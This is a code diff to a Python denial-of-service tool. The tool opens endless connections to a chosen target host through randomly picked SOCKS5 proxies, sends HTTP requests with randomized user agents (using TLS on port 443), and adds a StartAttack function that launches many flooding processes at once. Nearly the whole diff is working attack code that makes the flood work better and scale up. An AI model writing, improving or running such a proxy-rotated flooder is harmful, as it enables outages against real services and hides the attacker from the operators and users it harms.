@@ -100,7 +100,6 @@ def checkProxies():
 
 time.sleep(1)
 
-# Them darkdarkbruhbruhlmaolmao neu muon dung Pool Class
 def Flood():
     proxy = rC(proxies).strip().split(":")
     Connection = "Connection: Keep-Alive\r\n"
@@ -108,8 +107,9 @@ def Flood():
     User_Agent = "User-Agent: " + rC(userAgentList) + "\r\n\r\n"
     while True:
         try:
-            s = socks.socksocket()
-            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+            socks.set_default_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+            socket.socket = socks.socksocket
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((targetHost, targetPort))
             if targetPort == 443:
                 sslContext = ssl.SSLContext()
@@ -120,6 +120,8 @@ def Flood():
                 floodHeader = floodHeader.encode()
                 s.send(floodHeader)
             print("Flood sent " + proxy[0] + ":" + proxy[1])
+        except socket.error:
+            time.sleep(.1)
         except:
             pass
 
@@ -143,15 +145,8 @@ userAgentList = []
 for _ in range(100):
     userAgent = UserAgent().random
     userAgentList.append(userAgent)
-"""processList = []
-for indexPicker in range(threadNumber):
-    process = multiprocessing.Process(target=Flood)
-    process.Daemon = True
-    processList.append(process)
-    process.start()
-for process in processList:
-    process.join()"""
-#darkdarkbruhbruhlmaolmao = multiprocessing.Pool(processes=threadNumber)
-#darkdarkbruhbruhlmaolmao.map(Flood, 1)
-while True:
-    input()
+def StartAttack():
+    for indexPicker in range(threadNumber):
+        process = multiprocessing.Process(target=Flood)
+        process.Daemon = False
+        process.start()
